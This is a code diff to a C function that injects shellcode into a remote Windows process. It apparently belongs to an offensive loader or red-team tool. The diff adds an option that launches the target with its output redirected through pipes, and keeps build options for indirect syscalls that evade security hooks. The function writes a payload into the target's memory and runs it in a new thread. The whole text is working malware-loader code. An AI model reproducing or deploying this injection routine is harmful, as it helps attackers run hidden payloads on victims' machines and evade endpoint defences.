@@ -1,27 +1,47 @@
-#include "injection.h"
+#include "injectors.h"
 
 
 BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pPayload, SIZE_T sPayloadSize) {
-    PVOID		pShellcodeAddress			= NULL;
+	PVOID		pShellcodeAddress			= NULL;
 	SIZE_T		sOriginalSize				= sPayloadSize;
 	SIZE_T		sNumberOfBytesWritten		= 0;
-    DWORD		dwProcessId				    = 0;
+	DWORD		dwProcessId				    = 0;
 	DWORD		dwOldProtection				= 0;
 	NTSTATUS	status						= STATUS_SUCCESS;
 	HANDLE		hThread						= NULL;
+	HANDLE hStdOutRead = NULL, hStdOutWrite = NULL;
+	HANDLE hStdErrRead = NULL, hStdErrWrite = NULL;
 
-    WDebugPrint(L"[i] Searching For Process Id Of \"%s\" ...\n", szProcessName);
-#ifdef SYSCALL_ENABLED
-	if (!syscall_GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
-		DebugPrint("[!] Process is Not Found \n");
-		return -1;
+#if defined(REDIRECT_OUTPUT)
+    SECURITY_ATTRIBUTES  saAttr;
+	PROCESS_INFORMATION pi;
+    STARTUPINFO si;
+
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+
+    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)){
+        DebugPrint("StdoutRd CreatePipe: %d\n", GetLastError());
+		return FALSE;
 	}
+
+	if (!CreatePipe(&hStdErrRead, &hStdErrWrite, &saAttr, 0))
+		DebugPrint("StderrRd CreatePipe: %d\n", GetLastError());
+
+    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
+    SetHandleInformation(hStdErrRead, HANDLE_FLAG_INHERIT, 0);
+	
+	CreateRunningProcess(szProcessName, &dwProcessId, &hProcess, &hThread, hStdOutWrite, hStdErrWrite);
 #else
+	WDebugPrint(L"[i] Searching For Process Id Of \"%s\" ...\n", szProcessName);
+
 	if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
 		DebugPrint("[!] Process is Not Found \n");
 		return -1;
 	}
 #endif
+
 	DebugPrint("[+] DONE\n");
 	DebugPrint("[i] Found Target Process Pid: %d \n", dwProcessId);
 	DebugPrint("[i] Target process handle: 0x%p\n", hProcess);
@@ -31,8 +51,7 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pPayloa
 		return FALSE;
 	}
 	PrintMemoryBytes(hProcess, pShellcodeAddress, 20);
-	DebugPrint("[+] DONE \n\n");
-
+	
 	// Running the shellcode as a new thread's entry in the remote process
 	DebugPrint("[i] Executing Payload ... ");
 #ifdef HW_INDIRECT_SYSCALL
@@ -54,6 +73,15 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pPayloa
 	}
 #endif
 	DebugPrint("[+] DONE !\n");
+
+#if defined(REDIRECT_OUTPUT)
+	ReadFromRemotePipe(hStdOutRead);
+#endif
+
+	CloseHandle(hProcess);
+	CloseHandle(hThread);
+    CloseHandle(hStdOutRead);
+    CloseHandle(hStdOutWrite);
 
 	return TRUE;
 }
